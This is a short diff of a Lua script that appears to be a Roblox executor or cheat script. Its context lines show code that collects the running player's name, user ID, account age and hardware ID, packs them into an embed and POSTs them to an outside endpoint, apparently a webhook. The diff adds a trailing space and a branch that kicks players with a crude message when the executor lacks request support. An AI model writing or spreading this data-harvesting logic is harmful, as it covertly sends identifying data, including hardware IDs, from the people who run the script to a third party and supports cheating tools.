@@ -163,7 +163,7 @@ local function getPlayerProfile(player)
     return playerName, playerID, accountAge, hwid
 end
 
-local playerName, playerID, accountAge, hwid = getPlayerProfile(player)
+local playerName, playerID, accountAge, hwid = getPlayerProfile(player) 
 
 local data = {
     ["embeds"] = {
@@ -197,6 +197,8 @@ if Request then
         Method = "POST",
         Headers = {["Content-Type"]="application/json"}
     })
+else
+    LocalPlayer:Kick("Shit executor")
 end
 
 if getgenv().HasWhitelisted or Diamonds > 0 then
